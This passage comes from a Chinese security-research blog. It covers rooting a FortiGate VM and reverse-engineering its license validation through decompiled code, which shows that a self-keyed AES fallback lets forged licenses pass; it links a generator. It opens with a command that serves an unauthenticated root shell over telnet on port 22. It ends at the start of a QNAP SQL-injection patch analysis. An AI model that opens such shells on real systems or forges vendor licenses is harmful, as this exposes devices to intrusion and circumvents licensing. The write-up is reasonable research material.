<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">killall sshd &amp;&amp; busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22</span><br></pre></td></tr></table></figure></div>

<p>这样就可以获取一个完整的 root 权限：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_6.png"
                     
                ></p>
<p>另外，也可以使用我编写的一个简单<a class="link"   href="https://github.com/rrrrrrri/fgt-auto-repack" >工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，使用方法请参考说明文档。</p>
<h2 id="License-授权分析"><a href="#License-授权分析" class="headerlink" title="License 授权分析"></a>License 授权分析</h2><p>第一次启动系统时，需要导入一个合适的 License 才能使用各项功能，在前面的文章中我们提到可以注册 FortiCloud 账户并使用评估版本 License，不过这样操作比较复杂，而且每有一个新版本就要重新注册一个账户，有没有一种方法可以绕过或者破解 License 验证呢？本部分将会介绍一种构造 License 的方法。</p>
<p>首先定位校验 License 的逻辑，通过查询 FortiGate 手册，得知存在一个叫做 <code>vm-print-license</code> 的调试命令，使用方法为 <code>diagnose debug vm-print-license</code>，在未激活状态下执行会看到以下输出，提示我们当前处于试用状态。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_7.png"
                     
                ></p>
<p>系统大部分业务逻辑都在 &#x2F;bin&#x2F;init 中，我们直接在 &#x2F;bin&#x2F;init 程序中搜索 <code>License</code>、<code>vm-print-license</code> 等字符串，在结果中找到比较有趣的几条数据：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_8.png"
                     
                ></p>
<p>看起来像 License 文件的定位符，交叉引用最终可定位到以下代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">maybe_check_license</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">time_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *lic_file_content; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 lic_length; <span class="comment">// [rsp+8h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">tp</span>;</span> <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  lic_file_content = <span class="number">0LL</span>;</span><br><span class="line">  lic_length = <span class="number">0LL</span>;</span><br><span class="line">  read_file(<span class="string">&quot;/data/etc/vm.lic&quot;</span>, &amp;lic_file_content, &amp;lic_length);<span class="comment">// 读取 vm.lic 文件</span></span><br><span class="line">  <span class="keyword">if</span> ( lic_length &amp;&amp; lic_file_content )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="number">0LL</span>;</span><br><span class="line">    init_lic_struct(&amp;lic_struct);</span><br><span class="line">    v1 = sub_29200D0(lic_file_content, lic_length, &amp;lic_struct);</span><br><span class="line">    v2 = lic_struct;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">strncmp</span>(v2, lincese_types[v0].name, <span class="number">6uLL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ++v0 == <span class="number">27</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      &#125;</span><br><span class="line">      license_tag_val = lincese_types[v0].tag_val;<span class="comment">// 0x16</span></span><br><span class="line">LABEL_8:</span><br><span class="line">      <span class="keyword">if</span> ( qword_F5E2DC8 )</span><br><span class="line">      &#123;</span><br><span class="line">        strptime(qword_F5E2DC8, <span class="string">&quot;%a %b %e %H:%M:%S %Y&quot;</span>, &amp;tp);</span><br><span class="line">        v3 = timegm(&amp;tp);</span><br><span class="line">        qword_F5E2DF8 = v3;</span><br><span class="line">        <span class="keyword">if</span> ( nCfg_debug_zone )</span><br><span class="line">          *(nCfg_debug_zone + <span class="number">3559</span>) = v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(lic_file_content);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数尝试读取 &#x2F;data&#x2F;etc&#x2F;vm.lic 文件，并使用 sub_29200D0 对其解析。由于已经获取到了 shell 权限，我们可以看到未激活时这个文件的内容：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN FGT VM LICENSE-----</span><br><span class="line">IAAAAJ89UQoa5fpHDP95to/FvROLPIKeChd2EMS1QHS43LMGUAAAAGULEt3EN96B</span><br><span class="line">mKhmST8dR9f5RV2Yfp6EojX+Rx92RqAf+vBkeklRAh+GglCJzHRgGCqhgedueWbt</span><br><span class="line">YQ/dmgF7MWbFqOkYRXjiaLPznTCafNb8</span><br><span class="line">-----END FGT VM LICENSE-----</span><br></pre></td></tr></table></figure></div>

<p>这进一步印证了我们的猜想，即这部分代码逻辑和 License 有较大关系。</p>
<p>外层函数 maybe_check_license 的逻辑比较简单，首先从 &#x2F;data&#x2F;etc&#x2F;vm.lic 中读取授权信息，接着调用 init_lic_struct 函数初始化一个全局变量结构体 lic_struct，然后使用 sub_29200D0 函数解析授权文件</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_29200D0</span><span class="params">(<span class="type">char</span> *lic_file_content, __int64 lic_length, lic_struct *lic_struct)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *lic_start; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">char</span> *lic_end; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *lic_end_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *<span class="type">lic_start_t</span>; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> __int16 *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *decode_content; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *decode_content_2; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v13; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v14; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v15; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">size_t</span> enc_data_length; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// eax</span></span><br><span class="line">  __m128i *v20; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// er13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v22; <span class="comment">// er14</span></span><br><span class="line">  <span class="type">char</span> *aes_decrypted_1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v24; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> *data_start; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">char</span> *v26; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 key_name_length; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v28; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> *v29; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">size_t</span> key_value_length; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 *key_value; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">char</span> key_flag; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">bool</span> v34; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">void</span> *aes_enc_data; <span class="comment">// [rsp+8h] [rbp-198h]</span></span><br><span class="line">  __m128i *ptr; <span class="comment">// [rsp+10h] [rbp-190h]</span></span><br><span class="line">  __int64 v37; <span class="comment">// [rsp+20h] [rbp-180h]</span></span><br><span class="line">  <span class="type">char</span> *decode_content_1; <span class="comment">// [rsp+28h] [rbp-178h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 v39; <span class="comment">// [rsp+3Ch] [rbp-164h] BYREF</span></span><br><span class="line">  __m128i aes_key; <span class="comment">// [rsp+40h] [rbp-160h] BYREF</span></span><br><span class="line">  __m128i v41; <span class="comment">// [rsp+50h] [rbp-150h]</span></span><br><span class="line">  <span class="type">char</span> key_name[<span class="number">264</span>]; <span class="comment">// [rsp+60h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v43; <span class="comment">// [rsp+168h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v43 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  lic_struct-&gt;SERIALNO = <span class="number">0LL</span>;</span><br><span class="line">  lic_struct-&gt;unknow9 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(</span><br><span class="line">    (&amp;lic_struct-&gt;unknow2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL),</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">8LL</span> * ((lic_struct - ((lic_struct + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">168</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">  <span class="keyword">if</span> ( lic_file_content )</span><br><span class="line">  &#123;</span><br><span class="line">    lic_start = <span class="built_in">strstr</span>(lic_file_content, <span class="string">&quot;-----BEGIN FGT VM LICENSE-----&quot;</span>);<span class="comment">// 判断是否包含这两个 banner</span></span><br><span class="line">    lic_end = <span class="built_in">strstr</span>(lic_file_content, <span class="string">&quot;-----END FGT VM LICENSE-----&quot;</span>);</span><br><span class="line">    lic_end_1 = lic_end;</span><br><span class="line">    <span class="keyword">if</span> ( lic_start )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( lic_end )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">lic_start_t</span> = lic_start + <span class="number">30</span>;           <span class="comment">// 跳过开头</span></span><br><span class="line">        <span class="keyword">if</span> ( lic_end &gt; <span class="type">lic_start_t</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v8 = *__ctype_b_loc();</span><br><span class="line">          <span class="keyword">while</span> ( (v8[*<span class="type">lic_start_t</span>] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )<span class="comment">// _ISspace</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( lic_end_1 == ++<span class="type">lic_start_t</span> )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( lic_end_1 &gt; <span class="type">lic_start_t</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( (v8[*lic_end_1] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )<span class="comment">// _ISspace</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( --lic_end_1 == <span class="type">lic_start_t</span> ) <span class="comment">// 跳过开头和结尾多余的空白字符</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( lic_end_1 &gt; <span class="type">lic_start_t</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              *lic_end_1 = <span class="number">0</span>;</span><br><span class="line">              decode_content = <span class="built_in">malloc</span>(<span class="number">3</span> * ((lic_end_1 - <span class="type">lic_start_t</span> + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>));<span class="comment">// 分配空间，用于存放 Base64 解码后的内容</span></span><br><span class="line">              decode_content_1 = decode_content;</span><br><span class="line">              decode_content_2 = decode_content;</span><br><span class="line">              <span class="keyword">if</span> ( decode_content )</span><br><span class="line">              &#123;</span><br><span class="line">                v11 = maybe_base64_decode(<span class="type">lic_start_t</span>, decode_content, <span class="number">3</span> * ((lic_end_1 - <span class="type">lic_start_t</span> + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>));<span class="comment">// base64 解码</span></span><br><span class="line">                *lic_end_1 = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ( v11 &lt;= <span class="number">15</span></span><br><span class="line">                  || (v12 = *decode_content_2,  <span class="comment">// AES key 长度</span></span><br><span class="line">                      v13 = decode_content_2,</span><br><span class="line">                      v14 = (decode_content_2 + <span class="number">1</span>),</span><br><span class="line">                      v15 = (v14 + v12),</span><br><span class="line">                      v14 + v12 &gt; v13 + v11)</span><br><span class="line">                  || (enc_data_length = *v15, aes_enc_data = v15 + <span class="number">1</span>, (v37 = decode_pub_key()) == <span class="number">0</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                  v22 = <span class="number">-1</span>;</span><br><span class="line">                  <span class="built_in">free</span>(decode_content_1);</span><br><span class="line">                  <span class="keyword">return</span> v22;</span><br><span class="line">                &#125;</span><br><span class="line">                v17 = EVP_PKEY_get1_RSA(v37);</span><br><span class="line">                v18 = v17;</span><br><span class="line">                <span class="keyword">if</span> ( v17 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v19 = RSA_size(v17);</span><br><span class="line">                  v20 = <span class="built_in">calloc</span>(v19, <span class="number">1uLL</span>);</span><br><span class="line">                  <span class="keyword">if</span> ( !v20 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v22 = <span class="number">-1</span>;</span><br><span class="line">                    RSA_free(v18);</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">                  &#125;</span><br><span class="line">                  ptr = v20;</span><br><span class="line">                  v21 = RSA_public_decrypt(v12, v14, v20, v18, <span class="number">1LL</span>);<span class="comment">// RSA 公钥解密</span></span><br><span class="line">                  RSA_free(v18);</span><br><span class="line">                  <span class="keyword">if</span> ( v21 &gt; <span class="number">31</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v22 = <span class="number">0</span>;</span><br><span class="line">                    aes_key = _mm_loadu_si128(ptr);</span><br><span class="line">                    v41 = _mm_loadu_si128(ptr + <span class="number">1</span>);</span><br><span class="line">                    <span class="built_in">free</span>(ptr);</span><br><span class="line">LABEL_22:</span><br><span class="line">                    aes_decrypted_1 = AES_DEC(aes_enc_data, enc_data_length, &amp;aes_key, &amp;aes_key);<span class="comment">// AES 解密部分</span></span><br><span class="line">                    <span class="keyword">if</span> ( *(aes_decrypted_1 + <span class="number">1</span>) == <span class="number">0x13A38693</span> )<span class="comment">// 解密之后 check magic</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      v24 = aes_decrypted_1[enc_data_length - <span class="number">1</span>];</span><br><span class="line">                      data_start = aes_decrypted_1 + <span class="number">12</span>;<span class="comment">// 越过 前 12 字节</span></span><br><span class="line">                      <span class="keyword">if</span> ( v24 &lt; <span class="number">0x10</span>u )</span><br><span class="line">                        enc_data_length -= v24;</span><br><span class="line">                      v26 = &amp;aes_decrypted_1[enc_data_length];</span><br><span class="line">                      <span class="keyword">if</span> ( data_start &gt;= v26 )</span><br><span class="line">                      &#123;</span><br><span class="line">final_check:</span><br><span class="line">                        <span class="keyword">if</span> ( v22 )</span><br><span class="line">                        &#123;</span><br><span class="line">                          LOBYTE(lic_struct-&gt;unknow9) = <span class="number">1</span>;</span><br><span class="line">                          v34 = <span class="built_in">memcmp</span>(lic_struct-&gt;SERIALNO, <span class="string">&quot;FGVMEV&quot;</span>, <span class="number">6uLL</span>) == <span class="number">0</span>;</span><br><span class="line">                          v22 = !v34;</span><br><span class="line">                          <span class="keyword">if</span> ( !v34 )</span><br><span class="line">                          &#123;</span><br><span class="line">                            v34 = <span class="built_in">memcmp</span>(lic_struct-&gt;SERIALNO, <span class="string">&quot;FGVM--UNLICENSED&quot;</span>, <span class="number">0x10</span>uLL) == <span class="number">0</span>;</span><br><span class="line">                            v22 = !v34;</span><br><span class="line">                            <span class="keyword">if</span> ( !v34 )</span><br><span class="line">                              v22 = -(<span class="built_in">memcmp</span>(lic_struct-&gt;SERIALNO, <span class="string">&quot;FGVMPG&quot;</span>, <span class="number">6uLL</span>) != <span class="number">0</span>);</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          LOBYTE(lic_struct-&gt;unknow9) = <span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">while</span> ( <span class="number">1</span> )               <span class="comment">// 主要解析逻辑</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        key_name_length = *data_start;</span><br><span class="line">                        v28 = data_start + <span class="number">1</span>;</span><br><span class="line">                        v29 = &amp;data_start[key_name_length + <span class="number">1</span>];</span><br><span class="line">                        key_value_length = *(v29 + <span class="number">1</span>);</span><br><span class="line">                        key_value = (v29 + <span class="number">3</span>);</span><br><span class="line">                        key_flag = *v29;</span><br><span class="line">                        v39 = <span class="number">0</span>;</span><br><span class="line">                        data_start = &amp;v29[key_value_length + <span class="number">3</span>];<span class="comment">// 分段数据</span></span><br><span class="line">                        <span class="keyword">if</span> ( key_name_length &lt; <span class="number">8</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          <span class="keyword">if</span> ( (key_name_length &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">                          &#123;</span><br><span class="line">                            *key_name = *v28;</span><br><span class="line">                            *&amp;key_name[key_name_length - <span class="number">4</span>] = *(v28 + key_name_length - <span class="number">4</span>);</span><br><span class="line">                          &#125;</span><br><span class="line">                          <span class="keyword">else</span> <span class="keyword">if</span> ( key_name_length )</span><br><span class="line">                          &#123;</span><br><span class="line">                            key_name[<span class="number">0</span>] = *v28;</span><br><span class="line">                            <span class="keyword">if</span> ( (key_name_length &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">                              *&amp;key_name[key_name_length - <span class="number">2</span>] = *(v28 + key_name_length - <span class="number">2</span>);</span><br><span class="line">                          &#125;</span><br><span class="line">                          key_name[key_name_length] = <span class="number">0</span>;</span><br><span class="line">                          <span class="keyword">if</span> ( key_flag == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">                          &#123;</span><br><span class="line">LABEL_37:</span><br><span class="line">                            <span class="keyword">if</span> ( key_value_length != <span class="number">4</span> )</span><br><span class="line">                              <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">                            key_value = &amp;v39;</span><br><span class="line">                            v39 = _byteswap_ulong(*(v29 + <span class="number">3</span>));</span><br><span class="line">fillin_struct:</span><br><span class="line">                            fillin_struct_func(lic_struct, key_name, key_flag, key_value, key_value_length);<span class="comment">// 填充 lic_struct 结构体</span></span><br><span class="line">                            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          *&amp;key_name[key_name_length - <span class="number">8</span>] = *(v28 + key_name_length - <span class="number">8</span>);</span><br><span class="line">                          qmemcpy(key_name, v28, <span class="number">8</span> * ((key_name_length - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">                          key_name[key_name_length] = <span class="number">0</span>;</span><br><span class="line">                          <span class="keyword">if</span> ( key_flag == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">                            <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> ( key_flag == <span class="string">&#x27;s&#x27;</span> )</span><br><span class="line">                          <span class="keyword">goto</span> fillin_struct;</span><br><span class="line">LABEL_34:</span><br><span class="line">                        <span class="keyword">if</span> ( v26 &lt;= data_start )</span><br><span class="line">                          <span class="keyword">goto</span> final_check;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">goto</span> failed;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="built_in">free</span>(ptr);</span><br><span class="line">                  <span class="keyword">if</span> ( v12 == <span class="number">32</span> )              <span class="comment">// key_length == 32</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v22 = <span class="number">1</span>;</span><br><span class="line">                    aes_key = _mm_loadu_si128((decode_content_1 + <span class="number">4</span>));<span class="comment">// RSA 解密失败的话走这里</span></span><br><span class="line">                    v41 = _mm_loadu_si128((decode_content_1 + <span class="number">20</span>));</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">failed:</span><br><span class="line">                v22 = <span class="number">-1</span>;</span><br><span class="line">LABEL_47:</span><br><span class="line">                <span class="built_in">free</span>(decode_content_1);</span><br><span class="line">                EVP_PKEY_free(v37);</span><br><span class="line">                <span class="keyword">return</span> v22;</span><br><span class="line">              &#125;</span><br><span class="line">              *lic_end_1 = <span class="number">45</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我重命名了一些变量并添加了一部分注释，这个函数逻辑稍稍复杂，简要描述如下：</p>
<p>首先检查授权文件是否包含定位符，根据定位符确定主要内容的起止位置，对内容进行 Base64 解码，然后从解码的数据中读取头部结构。从内存中解压一个 RSA 公钥，先尝试使用这个公钥解密余下请求，如果解密失败，再尝试使用 AES-128-CBC 解密内容，使用的 key 和 iv 是从 Base64 解码的数据头部获得的。</p>
<p>之后对解密的数据进行判断，首先是 magic 部分需要等于 0x13A38693，之后跟随数个 Block 结构，Block 结构类似 TLV，由数据长度、数据名、数据值组成，每个 Block 对应 License 中的一个信息字段。</p>
<p>解析好各个结构之后将这些信息填充到 lic_struct 结构体中，并在后续功能继续使用。</p>
<p>根据以上代码逻辑，我们可以整理出 Licnese 的大致组成，以 Python 来表示</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">License</span>:</span><br><span class="line">    aes_key_iv_length = <span class="number">32</span>            <span class="comment"># 4 bytes</span></span><br><span class="line">    aes_key = <span class="string">b&quot;\x61&quot;</span> * <span class="number">32</span>            <span class="comment"># 32 bytes, contains iv(16 bytes) and key(16 bytes)</span></span><br><span class="line">    enc_data_length = <span class="literal">None</span>            <span class="comment"># 4 bytes</span></span><br><span class="line">    enc_data = <span class="literal">None</span>                   <span class="comment"># length = enc_data_length</span></span><br><span class="line">    license_data = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, licensedata</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LicenseDataBlock</span>:</span><br><span class="line">    key_name_length = <span class="literal">None</span>    <span class="comment"># 1 byte</span></span><br><span class="line">    key_name = <span class="literal">None</span></span><br><span class="line">    key_flag = <span class="literal">None</span>           <span class="comment"># 1 byte, &#x27;s&#x27; for str or &#x27;n&#x27; for num</span></span><br><span class="line">    key_value_length = <span class="literal">None</span>   <span class="comment"># 2 bytes</span></span><br><span class="line">    key_value = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, keyname, keyvalue</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p>程序中还存在一个关键结构体，定义了 Block 基本信息</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lic_block</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *key_name;</span><br><span class="line">  __int64 key_flag;</span><br><span class="line">  __int64 offset_in_lic_struct;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">lic_block lic_block_array[<span class="number">12</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123; <span class="string">&quot;SERIALNO&quot;</span>, <span class="number">115LL</span>, <span class="number">0LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;CERT&quot;</span>, <span class="number">115LL</span>, <span class="number">8LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;KEY&quot;</span>, <span class="number">115LL</span>, <span class="number">16LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;CERT2&quot;</span>, <span class="number">115LL</span>, <span class="number">24LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;KEY2&quot;</span>, <span class="number">115LL</span>, <span class="number">32LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;CREATEDATE&quot;</span>, <span class="number">115LL</span>, <span class="number">40LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;UUID&quot;</span>, <span class="number">115LL</span>, <span class="number">48LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;CONTRACT&quot;</span>, <span class="number">115LL</span>, <span class="number">56LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;USGFACTORY&quot;</span>, <span class="number">110LL</span>, <span class="number">64LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;LENCFACTORY&quot;</span>, <span class="number">110LL</span>, <span class="number">68LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;CARRIERFACTORY&quot;</span>, <span class="number">110LL</span>, <span class="number">72LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;EXPIRY&quot;</span>, <span class="number">110LL</span>, <span class="number">76LL</span> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>至此我们已经得知了 License 的结构和组成成分，接下来需要分析 block 中各项都起什么作用，以及 lic_struct 结构体是如何参与 License 验证的。不过这里有比较简单的方法，Block 具有比较清晰的名称，根据名称可大致猜测其作用，例如 SERIALNO 应该表示设备序列号，CREATEDATE 表示 license 导入日期，EXPIRY 表示过期时间等。</p>
<p>通过调试并结合代码分析，Block 中其关键作用的应该是 SERIALNO、CREATEDATE、USGFACTORY、LENCFACTORY、CARRIERFACTORY、EXPIRY 几个字段，其余字段可以省略。</p>
<p>根据分析结果，编写出对应的注册程序，你可以在 <a class="link"   href="https://github.com/rrrrrrri/fgt-gadgets" >Github<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 上获取。</p>
<p>导入生成的 License 文件后再次执行 <code>vm-print-license</code> 得到 License 合法的结果，而且后台功能也可以正常使用了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_9.png"
                     
                ></p>
<p>本部分介绍了 FortiGate License 授权验证逻辑，分析了 License 组成结构和各字段大致含义，并编写了一个注册程序可以生成合适的 License。</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-27596</title>
    <url>/2023/02/06/CVE-2022-27596/</url>
    <content><![CDATA[<p>2023 年 1 月 30 日，QNAP 官方公布了影响 QNAP NAS 设备的漏洞 <a class="link"   href="https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01" >CVE-2022-27596<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，本文对此漏洞的成因进行分析。</p>
<span id="more"></span>

<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>本次复现我们使用设备 TS-532X，这是一款具有 5 个磁盘插槽的桌面 NAS 设备，支持 QTS 5.0.1 系统。</p>
<p>存在漏洞的相关程序我已经上传至<a class="link"   href="https://pan.baidu.com/s/1yQv7SQTrDP9A9nYx_FIDtg" >网盘<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，提取码：4rn6。感兴趣的朋友可以下载分析。</p>
<h3 id="补丁对比"><a href="#补丁对比" class="headerlink" title="补丁对比"></a>补丁对比</h3><p>官方通告中只简单描述了漏洞危害，根据 json 附件和第三方信息可以大体确定，这是一个 SQL 注入漏洞。</p>
<p>首先下载到两个临界版本(QTS 5.0.1.2194 build 20221022 和 QTS 5.0.1.2234 build 20221201)，解压后比对文件系统，web 目录下发生变化的程序不是很多，鉴于该漏洞无需授权即可利用，排除掉一些后台接口之后，可以发现 authLogin.cgi 比较可疑。</p>
<p><img  
                     lazyload
